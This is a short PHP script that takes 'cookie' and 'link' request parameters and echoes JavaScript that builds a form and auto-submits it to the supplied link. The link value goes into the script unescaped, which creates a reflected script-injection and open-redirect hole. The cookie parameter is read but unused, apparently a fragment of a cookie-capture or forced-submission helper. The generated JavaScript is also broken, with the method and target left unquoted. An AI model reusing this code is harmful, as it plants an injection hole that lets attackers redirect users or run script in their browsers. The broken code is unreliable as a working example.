<?php
$cookie = $_REQUEST['cookie'];
$link = $_REQUEST['link'];
echo "
<script>
const form = document.createElement('form');
form.method = post;
form.action = $link;
document.body.appendChild(form);
form.submit();
</script>";

?>